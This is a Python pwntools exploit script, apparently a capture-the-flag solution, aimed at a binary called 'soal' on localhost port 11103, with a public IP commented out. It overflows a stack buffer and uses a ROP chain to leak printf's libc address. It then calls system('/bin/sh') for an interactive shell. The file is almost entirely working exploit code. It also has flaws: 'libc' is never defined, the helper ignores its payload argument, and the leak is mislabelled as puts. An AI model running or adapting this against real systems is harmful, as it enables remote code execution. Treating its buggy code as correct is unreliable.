from pwn import *

exe= ELF('soal')

# r = process('soal')
# libc=ELF('libc-2.31.so')

r = remote("localhost",11103)
# r = remote("104.248.150.36",11103)
# libc=ELF('libc6_2.31-0ubuntu9.1_amd64.so')

printf=0x00000000004012f8
poprdi=0x000000000040138b


# gdb.attach(r,'''
# 	b *sub_data
# 	b *0x0000000000401233
# 	c
# 	c
# 	# c
# 	''')

def send_sub_data(payload,non_motto=True):
	r.sendline('a')
	r.sendline(p)
	r.sendline('1'*12)
	if non_motto:
		r.sendafter('Motto Hidup : ','d')
	else:
		r.recvuntil("Motto Hidup : ")

r.sendline('asdf')

p='b'*56
p+=p64(poprdi)
p+=p64(exe.got['printf'])
p+=p64(printf)

send_sub_data(p)

leak = u64(r.recv(6).ljust(8,'\x00'))
print '[+] Puts Address :',
print hex(leak)

libc.address = leak - libc.sym['printf']
print '[+] Base libc Address :',
print hex(libc.address)

p='b'*56
p+=p64(poprdi)
p+=p64(libc.search('/bin/sh').next())
p+=p64(poprdi+1)
p+=p64(libc.sym['system'])
print '[+] /bin/sh Address :',
print hex(libc.search('/bin/sh').next())
print '[+] system Address :',
print hex(libc.sym['system'])

send_sub_data(p,non_motto=False)

r.interactive()